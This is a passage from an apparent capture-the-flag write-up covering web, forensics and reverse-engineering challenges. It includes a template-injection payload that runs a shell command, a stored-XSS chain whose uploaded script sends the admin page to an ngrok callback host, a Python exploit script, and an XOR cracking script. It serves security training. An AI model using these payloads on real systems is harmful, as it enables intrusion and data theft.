</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"username"</span><span class="p">:</span><span class="s2">"{{:</span><span class="se">\"</span><span class="s2">pwnd</span><span class="se">\"</span><span class="s2">.toString.constructor.call({},</span><span class="se">\"</span><span class="s2">return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()</span><span class="se">\"</span><span class="s2">)()}}"</span><span class="p">,</span><span class="nl">"password"</span><span class="p">:</span><span class="s2">"testpass"</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Refreshing the admin dashboard, I got the flag;</p>

<p><img src="/assets/img/20230323122819.png" alt="" /></p>

<p><br /></p>

<h4 id="spybug">SpyBug</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>medium</em></li>
</ul>

<p><img src="/assets/img/20230323123242.png" alt="" /></p>

<p>Login form is POSTed to <code class="language-plaintext highlighter-rouge">/panel/login</code>. Going through the downloaded source, here is the implementation;</p>

<p><img src="/assets/img/20230323123625.png" alt="" /></p>

<p><img src="/assets/img/20230323123815.png" alt="" /></p>

<p>Notice that the <code class="language-plaintext highlighter-rouge">username</code> passed to the <code class="language-plaintext highlighter-rouge">checkUserLogin()</code> function was not casted to a string, and was later used in a <em>NoSQL</em> query. This could’ve been vulnerable to <em>NoSQL</em> injection by passing <code class="language-plaintext highlighter-rouge">username</code> as a JSON object, if not for the call to <code class="language-plaintext highlighter-rouge">bcrypt.compareSync()</code> that validates the password entered.</p>

<p>Looking deeper into the code, there are routes defined for <em>agents</em> in <code class="language-plaintext highlighter-rouge">routes/agents.js</code> file;</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">/agents/register</code> - GET request. Creates a new agent, and return the agent’s identifier and token.</li>
  <li><code class="language-plaintext highlighter-rouge">/agents/check/:identifier/:token</code> - GET request. Returns a code <code class="language-plaintext highlighter-rouge">200</code> HTTP response if agent is valid.</li>
  <li><code class="language-plaintext highlighter-rouge">/agents/details/:identifier/:token</code> - POST request. For updating agent info. Accepts a json of <code class="language-plaintext highlighter-rouge">hostname</code>, <code class="language-plaintext highlighter-rouge">platform</code>, and <code class="language-plaintext highlighter-rouge">arch</code>.</li>
  <li><code class="language-plaintext highlighter-rouge">/agents/upload/:identifier/:token</code> - Multipart POST request for uploading file to <code class="language-plaintext highlighter-rouge">/uploads/</code>, which is publicly accessible.</li>
</ul>

<p>The expose upload feature is interesting. It uses some metadata checks to validate files being uploaded, which can be easily forged;</p>

<p><img src="/assets/img/20230323125527.png" alt="" /></p>

<p>Another filter is also in place that validates uploaded file contents, but the regex used is very loose;</p>

<p><img src="/assets/img/20230323125202.png" alt="" /></p>

<p>The above check can be passed by writing a string that matches the regex in uploaded file, independent of position;</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="c1">// RIFFAAAAWAVE - Whitelisted bytes in JS comment. Totally valid</span>
<span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Looking into how agents are handled, I found that the code for updating agents info does not do any sanitation;</p>

<p><img src="/assets/img/20230323125849.png" alt="" /></p>

<p><img src="/assets/img/20230323125937.png" alt="" /></p>

<p>This is interesting because all agents are rendered at the administrators homepage after login. This could be used to execute stored XSS on the admin.</p>

<p>The NodeJS server runs a <em>Puppeteer</em> bot that authenticates as admin every 60 seconds;</p>

<p><img src="/assets/img/20230323130639.png" alt="" /></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre></td><td class="rouge-code"><pre><span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">dotenv</span><span class="dl">"</span><span class="p">).</span><span class="nx">config</span><span class="p">();</span>

<span class="kd">const</span> <span class="nx">puppeteer</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">puppeteer</span><span class="dl">"</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">browserOptions</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">headless</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
  <span class="na">executablePath</span><span class="p">:</span> <span class="dl">"</span><span class="s2">/usr/bin/chromium-browser</span><span class="dl">"</span><span class="p">,</span>
  <span class="na">args</span><span class="p">:</span> <span class="p">[</span>
    <span class="dl">"</span><span class="s2">--no-sandbox</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--disable-background-networking</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--disable-default-apps</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--disable-extensions</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--disable-gpu</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--disable-sync</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--disable-translate</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--hide-scrollbars</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--metrics-recording-only</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--mute-audio</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--no-first-run</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--safebrowsing-disable-auto-update</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--js-flags=--noexpose_wasm,--jitless</span><span class="dl">"</span><span class="p">,</span>
  <span class="p">],</span>
<span class="p">};</span>

<span class="nx">exports</span><span class="p">.</span><span class="nx">visitPanel</span> <span class="o">=</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="k">try</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">browser</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">(</span><span class="nx">browserOptions</span><span class="p">);</span>
    <span class="kd">let</span> <span class="nx">context</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">createIncognitoBrowserContext</span><span class="p">();</span>
    <span class="kd">let</span> <span class="nx">page</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">context</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>

    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">goto</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://0.0.0.0:</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">API_PORT</span><span class="p">,</span> <span class="p">{</span>
      <span class="na">waitUntil</span><span class="p">:</span> <span class="dl">"</span><span class="s2">networkidle2</span><span class="dl">"</span><span class="p">,</span>
      <span class="na">timeout</span><span class="p">:</span> <span class="mi">5000</span><span class="p">,</span>
    <span class="p">});</span>

    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="dl">"</span><span class="s2">#username</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="dl">"</span><span class="s2">#password</span><span class="dl">"</span><span class="p">,</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">ADMIN_SECRET</span><span class="p">);</span>
    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">click</span><span class="p">(</span><span class="dl">"</span><span class="s2">#loginButton</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">waitForTimeout</span><span class="p">(</span><span class="mi">5000</span><span class="p">);</span>
    <span class="k">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">};</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>On testing XSS through agents info update locally, the injection worked but the browser blocks the code;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>POST /agents/details/d9624cf2-3dd5-40ad-8132-fd9a292e1ef3/405cc6bc-484f-4e94-aed6-396144874213 HTTP/1.1
Host: debian.local:5000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-GB,en
Accept-Encoding: gzip, deflate
Cookie: connect.sid=s%3AvcdDZtZajSbryflLimysDJ4F8TdrUHxb.vFCYANEbw4vcD9se%2ByefOO7WT6sdMQf9%2F4tRJ3%2BbR2M
Connection: close
Content-Type: application/json
Content-Length: 116

{"hostname":"&lt;script&gt;alert(1)&lt;/script&gt;", "platform":"linux", "arch":"x86"}
</pre></td></tr></tbody></table></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">index.js</code> showed the server is using some XSS-prevention headers (<em>Content Security Policy</em>);</p>

<p><img src="/assets/img/20230323131232.png" alt="" /></p>

<p>While the above would block all JS embedded directly, the <code class="language-plaintext highlighter-rouge">script-src 'self'</code> policy would allow injected <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tags that load files on the same origin. This is a big deal since we already have an <strong>open file upload vulnerability</strong> on the server.</p>

<p>To exploit this, I wrote a JS payload <code class="language-plaintext highlighter-rouge">payload.js</code> that satisfies the regex filter. When loaded, this will base64-encode the current page content and send it to my server;</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="c1">// RIFFAAAAWAVE</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">`http://1e90-197-210-71-140.ngrok.io/?loot=</span><span class="p">${</span><span class="nx">btoa</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">)}</span><span class="s2">`</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I then wrote a python script <code class="language-plaintext highlighter-rouge">exploit.py</code> to upload the payload and inject the XSS;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#-----------------------------------------
# SpyBug - Cyber Apocalypse 2023 solution.
#                          Author: 4g3nt47
#-----------------------------------------
</span>
<span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span> <span class="n">json</span>

<span class="n">api</span> <span class="o">=</span> <span class="s">"http://139.59.173.68:31674"</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[*] Registering agent..."</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">api</span><span class="si">}</span><span class="s">/agents/register"</span><span class="p">).</span><span class="n">text</span><span class="p">)</span>
<span class="nb">id</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s">"identifier"</span><span class="p">]</span>
<span class="n">token</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s">"token"</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] id: </span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="se">\n</span><span class="s">[+] token: </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"[*] Uploading payload..."</span><span class="p">)</span>
<span class="n">url</span> <span class="o">=</span> <span class="n">api</span> <span class="o">+</span> <span class="s">"/uploads/"</span> <span class="o">+</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">api</span><span class="si">}</span><span class="s">/agents/upload/</span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s">'recording'</span><span class="p">:</span> <span class="p">(</span><span class="s">'payload.wav'</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="s">'payload.js'</span><span class="p">),</span> <span class="s">'audio/wave'</span><span class="p">)}).</span><span class="n">text</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Payload uploaded to: </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"[*] Injecting XSS payload..."</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">api</span><span class="si">}</span><span class="s">/agents/details/</span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"hostname"</span><span class="p">:</span><span class="s">"&lt;script src='/uploads/"</span> <span class="o">+</span> <span class="n">url</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"/"</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s">"'&gt;&lt;/script&gt;"</span><span class="p">,</span> <span class="s">"platform"</span><span class="p">:</span><span class="s">"haha"</span><span class="p">,</span> <span class="s">"arch"</span><span class="p">:</span><span class="s">"haha"</span><span class="p">}).</span><span class="n">text</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The exploit ran successfully;</p>

<p><img src="/assets/img/20230323132828.png" alt="" /></p>

<p>After a few seconds, I got a callback;</p>

<p><img src="/assets/img/20230323132919.png" alt="" /></p>

<p>The decoded base64 contains the flag;</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container login mt-5 mb-5"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"col-md-10"</span><span class="nt">&gt;&lt;h1&gt;&lt;i</span> <span class="na">class=</span><span class="s">"las la-satellite-dish"</span><span class="nt">&gt;&lt;/i&gt;</span><span class="ni">&amp;nbsp;</span>Spybug v1<span class="nt">&lt;/h1&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"col-md-2 float-right"</span><span class="nt">&gt;&lt;a</span> <span class="na">class=</span><span class="s">"btn login-btn mt-3"</span> <span class="na">href=</span><span class="s">"/panel/logout"</span><span class="nt">&gt;</span>Log-out<span class="nt">&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;hr&gt;&lt;h2&gt;</span>Welcome back HTB{p01yg10t5_4nd_35p10n4g3}<span class="nt">&lt;/h2&gt;&lt;hr&gt;&lt;h3&gt;&lt;i</span> <span class="na">class=</span><span class="s">"las la-laptop"</span><span class="nt">&gt;&lt;/i&gt;</span><span class="ni">&amp;nbsp;</span>Agents<span class="nt">&lt;/h3&gt;&lt;table</span> <span class="na">class=</span><span class="s">"w-100"</span><span class="nt">&gt;&lt;thead&gt;&lt;tr&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;</span>ID<span class="nt">&lt;/th&gt;&lt;th&gt;</span>Hostname<span class="nt">&lt;/th&gt;&lt;th&gt;</span>Platform<span class="nt">&lt;/th&gt;&lt;th&gt;</span>Arch<span class="nt">&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;</span>7ecf63f2-25bb-45f2-9a7a-54fd3583bda5<span class="nt">&lt;/td&gt;&lt;td&gt;&lt;script </span><span class="na">src=</span><span class="s">"/uploads/a6f135d0-aed4-47eb-a374-b42c91b9553f"</span><span class="nt">&gt;&lt;/script&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<hr />
<p><br /></p>

<h3 id="forensics">Forensics</h3>
<p><br /></p>

<h4 id="roten">Roten</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>easy</em></li>
</ul>

<p>Downloaded files contain a PCAP file;</p>

<p><img src="/assets/img/20230323134144.png" alt="" /></p>

<p>Loading it up in wireshark and setting a filter to only show HTTP traffic showed lots of <code class="language-plaintext highlighter-rouge">404</code> responses, which is common in web bruteforce;</p>

<p><img src="/assets/img/20230323134332.png" alt="" /></p>

<p>Following the HTTP stream confirmed this as the <em>User-Agent</em> was that of <code class="language-plaintext highlighter-rouge">wfuzz</code>, a web fuzzer;</p>

<p><img src="/assets/img/20230323134622.png" alt="" /></p>

<p>This could be the attacker. Searching for POST requests found one for a PHP file;</p>

<p><img src="/assets/img/20230323135221.png" alt="" /></p>

<p><img src="/assets/img/20230323135342.png" alt="" /></p>

<p>The PHP file was obfuscated. At the last line, it calls <code class="language-plaintext highlighter-rouge">eval()</code> to execute the payload after self-deobfuscation. I replaced <code class="language-plaintext highlighter-rouge">eval</code> with <code class="language-plaintext highlighter-rouge">echo</code>, which simply prints the decoded payload. The flag was inside;</p>

<p><img src="/assets/img/20230323135602.png" alt="" /></p>

<p><br /></p>

<h4 id="packet-cyclone">Packet Cyclone</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>easy</em></li>
</ul>

<p>The downloaded files contain some <code class="language-plaintext highlighter-rouge">.evtx</code> log files. I installed <code class="language-plaintext highlighter-rouge">libevtx-utils</code>, which provides <code class="language-plaintext highlighter-rouge">evtxexport</code> for reading <code class="language-plaintext highlighter-rouge">.evtx</code> files on linux. The file <code class="language-plaintext highlighter-rouge">Microsoft-Windows-Sysmon%4Operational.evtx</code> contains the <em>sysmon</em> event logs, and was exported using;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>extxexport Microsoft-Windows-Sysmon%4Operational.evtx <span class="o">&gt;</span> sysmon.txt
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I loaded the <code class="language-plaintext highlighter-rouge">sysmon.txt</code> file and the rules in <code class="language-plaintext highlighter-rouge">sigma_rules/</code> for guidance, and was able to answer the questions;</p>

<p><img src="/assets/img/20230323144838.png" alt="" /></p>

<p><br /></p>

<h4 id="relic-maps">Relic Maps</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>medium</em></li>
</ul>

<blockquote>
  <p>Pandora received an email with a link claiming to have information about the location of the relic and attached ancient city maps, but something seems off about it. Could it be rivals trying to send her off on a distraction? Or worse, could they be trying to hack her systems to get what she knows?Investigate the given attachment and figure out what’s going on and get the flag. The link is to http://relicmaps.htb:/relicmaps.one. The document is still live (relicmaps.htb should resolve to your docker instance).</p>
</blockquote>

<p>No downloadables for this challenge, so it starts blind. Using curl, I downloaded the file linked above. <code class="language-plaintext highlighter-rouge">file</code> could not identify it’s type;</p>

<p><img src="/assets/img/20230323141307.png" alt="" /></p>

<p>Running <code class="language-plaintext highlighter-rouge">strings</code> on the file revealed some commands that reference 2 interesting URLs;</p>

<p><img src="/assets/img/20230323141450.png" alt="" /></p>

<p>The files were downloaded. <code class="language-plaintext highlighter-rouge">topsecret-maps.one</code> is another blob, but <code class="language-plaintext highlighter-rouge">window.bat</code> is an obfuscated batch file with some base64 encoded blobs;</p>

<p><img src="/assets/img/20230323141612.png" alt="" /></p>

<p>This <a href="https://github.com/DissectMalware/batch_deobfuscator">batch deobfuscator</a> did a great job of making the file more readable. After a bit of manual cleanup, it became obvious that the batch file is using <em>powershell</em> to decrypt, decompress, and execute a payload. The segment of interest is;</p>

<p><img src="/assets/img/20230323142721.png" alt="" /></p>

<p>As you can see above;</p>
<ul>
  <li>Line <code class="language-plaintext highlighter-rouge">1 - 7</code> - Loads a file named <code class="language-plaintext highlighter-rouge">script.bat</code>, split it based on newlines, and select all lines that starts with <code class="language-plaintext highlighter-rouge">:: </code></li>
  <li>Line <code class="language-plaintext highlighter-rouge">8</code> - Base64 decode the lines selected above</li>
  <li>Line <code class="language-plaintext highlighter-rouge">9 - 13</code> - Initialize an AES cipher with;
    <ul>
      <li>Mode: CBC</li>
      <li>IV: <code class="language-plaintext highlighter-rouge">2hn/J717js1MwdbbqMn7Lw==</code></li>
      <li>Key: <code class="language-plaintext highlighter-rouge">0xdfc6tTBkD+M0zxU7egGVErAsa/NtkVIHXeHDUiW20=</code></li>
    </ul>
  </li>
</ul>

<p>The above information is enough to decrypt the payload in <code class="language-plaintext highlighter-rouge">script.bat</code>, but we do not have access to the file. However, the deobfuscated <code class="language-plaintext highlighter-rouge">window.bat</code> file does have a line that starts with <code class="language-plaintext highlighter-rouge">:: </code> + a long base64 encoded blob;</p>

<p><img src="/assets/img/20230323143256.png" alt="" /></p>

<p>So I copied it and head over to <a href="https://gchq.github.io/CyberChef/">CyberChef</a>, and was able to decrypt it using the following recipe;</p>

<p><img src="/assets/img/20230323143734.png" alt="" /></p>

<p>I decoded the base64 encoded output from Cyber Chef and saved it locally. <code class="language-plaintext highlighter-rouge">file</code> identified it as <code class="language-plaintext highlighter-rouge">gzip</code>, but was unable to extract;</p>

<p><img src="/assets/img/20230323143934.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">binwalk</code> however has no such weakness, and was able to extract the file, which was indentified as a 32-bit windows executable;</p>

<p><img src="/assets/img/20230323144103.png" alt="" /></p>

<p>Loading the binary in <em>radare2</em> and dumping the strings table revealed the flag;</p>

<p><img src="/assets/img/20230323144304.png" alt="" /></p>

<p>This could also be accomplished by running <code class="language-plaintext highlighter-rouge">strings</code> in 16-bit little endian mode;</p>

<p><img src="/assets/img/20230323144417.png" alt="" /></p>

<p><br /></p>

<hr />
<p><br /></p>

<h3 id="rev">Rev</h3>
<p><br /></p>

<h4 id="she-shells-c-shells">She Shells C Shells</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>very easy</em></li>
</ul>

<p><img src="/assets/img/20230323145404.png" alt="" /></p>

<p>A bit of reversing revealed the logic used in password validation inside the function <code class="language-plaintext highlighter-rouge">func_flag()</code>;</p>

<p><img src="/assets/img/20230323150650.png" alt="" /></p>

<p>The above translate to;</p>

<pre><code class="language-C">fgets(_password_entered, 256, stdin);
for ( i = 0; i &lt;= 0x4C; ++i )
  _password_entered[i] ^= m1[i];
if ( memcmp(_password_entered, &amp;t, 0x4DuLL) )
  return 0xFFFFFFFFLL;
for ( j = 0; j &lt;= 0x4C; ++j )
  _password_entered[j] ^= m2[j];
printf("Flag: %s\n", _password_entered);
return 0LL;
</code></pre>

<p>Setting a breakpoint and stepping through the function;</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">m1</code> - <code class="language-plaintext highlighter-rouge">6e3fc3b9d78d1558e50ffbac224d57dbdfcfedfc1c846ad81ca617c4c1bfa08587a143d4584f8da8b2f27ca3b98637dabf070a7e73df5c60aecacfb9e0deff0070b9e45fc89ab351f5aea87e8d</code></li>
  <li><code class="language-plaintext highlighter-rouge">t</code> - <code class="language-plaintext highlighter-rouge">2c4ab799a3e57078936e97d9476d38bdffbb85996fe14aab74c37ba8b29fd7ecebcd63b23923e184929609c699f258facb6f6f5e1fbe2b138ea5a99993ab8f701cc0c43ea6fe933590c3c910e9</code></li>
  <li><code class="language-plaintext highlighter-rouge">m2</code> - <code class="language-plaintext highlighter-rouge">641ef5e2c097441bf85ff9be185d488e91e4f6f15c8d269e2ba102f7c6f7e4b398fe57ed4a4bd1f6a1eb09c699f258facb6f6f5e1fbe2b138ea5a99993ab8f701cc0c43ea6fe933590c3c910e9</code></li>
</ul>

<p>Note that <code class="language-plaintext highlighter-rouge">0x4c</code> (76) is the highest index used in the loop, meaning our passkey is a maximum of <strong>77</strong> characters long.</p>

<p>Knowing this, I wrote a script to crack it;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#------------------------------------------------------
# She Shells C Shells - Cyber Apocalypse 2023 solution.
#                                       Author: 4g3nt47
#------------------------------------------------------
</span>
<span class="n">m1</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"6e3fc3b9d78d1558e50ffbac224d57dbdfcfedfc1c846ad81ca617c4c1bfa08587a143d4584f8da8b2f27ca3b98637dabf070a7e73df5c60aecacfb9e0deff0070b9e45fc89ab351f5aea87e8d"</span><span class="p">)</span>
<span class="n">t</span>  <span class="o">=</span> <span class="sa">b</span><span class="s">""</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"2c4ab799a3e57078936e97d9476d38bdffbb85996fe14aab74c37ba8b29fd7ecebcd63b23923e184929609c699f258facb6f6f5e1fbe2b138ea5a99993ab8f701cc0c43ea6fe933590c3c910e9"</span><span class="p">)</span>
<span class="n">m2</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"641ef5e2c097441bf85ff9be185d488e91e4f6f15c8d269e2ba102f7c6f7e4b398fe57ed4a4bd1f6a1eb09c699f258facb6f6f5e1fbe2b138ea5a99993ab8f701cc0c43ea6fe933590c3c910e9"</span><span class="p">)</span>

<span class="n">plain_pass</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">77</span><span class="p">):</span>
  <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="n">m1</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
      <span class="n">plain_pass</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">))</span>
      <span class="k">break</span>

<span class="k">print</span><span class="p">(</span><span class="s">"[+] plain_pass: "</span> <span class="o">+</span> <span class="n">plain_pass</span><span class="p">)</span>
<span class="n">plain_pass</span> <span class="o">=</span> <span class="n">plain_pass</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">42</span><span class="p">):</span>
  <span class="n">flag</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">m2</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[+] flag: "</span> <span class="o">+</span> <span class="n">flag</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20230323151608.png" alt="" /></p>

<p><br /></p>

<h4 id="hunting-license">Hunting License</h4>
<p><br /></p>

<ul>
  <li>DIfficulty: <em>easy</em></li>
</ul>

<p>This is a Q&amp;A based challenge. Binary on server differs with the one given to players. Solved all questions after a bit of reversing;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
